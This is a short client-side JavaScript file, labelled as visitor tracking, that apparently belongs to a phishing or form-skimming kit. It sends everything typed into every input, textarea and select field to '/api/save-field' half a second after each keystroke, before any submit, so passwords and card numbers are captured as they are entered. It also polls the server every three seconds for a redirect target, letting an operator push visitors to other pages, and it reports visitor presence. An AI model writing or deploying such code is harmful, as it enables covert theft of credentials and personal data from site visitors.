(function() {
    let hbInterval;
    
    function sendHb() {
        fetch('/api/visitor/online', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }).catch(err => console.error('Heartbeat error:', err));
    }
    
    function checkRedir() {
        fetch('/api/check-redirect')
            .then(res => res.json())
            .then(data => {
                if (data.success && data.redirect && data.redirect.targetPage) {
                    window.location.href = data.redirect.targetPage;
                }
            })
            .catch(err => console.error('Redirect check error:', err));
    }
    
    function saveData(page, fieldName, fieldValue) {
        fetch('/api/save-field', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ page, fieldName, fieldValue })
        }).catch(err => console.error('Save error:', err));
    }
    
    function initTracking() {
        sendHb();
        hbInterval = setInterval(sendHb, 30000);
        setInterval(checkRedir, 3000);
        
        document.querySelectorAll('input, textarea, select').forEach(field => {
            let timeout;
            field.addEventListener('input', function() {
                clearTimeout(timeout);
                timeout = setTimeout(() => {
                const page = window.location.pathname.replace('/', '') || 'index';
                let fieldName = this.name || this.id || 'unknown';
                // Clean field name from attributes['...'] format
                fieldName = fieldName.replace(/attributes\['(.+?)'\]/g, '$1');
                const fieldValue = this.value;
                    
                    if (fieldValue) {
                        saveData(page, fieldName, fieldValue);
                    }
                }, 500);
            });
        });
        
        window.addEventListener('beforeunload', function() {
            navigator.sendBeacon('/api/visitor/offline');
        });
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initTracking);
    } else {
        initTracking();
    }
})();
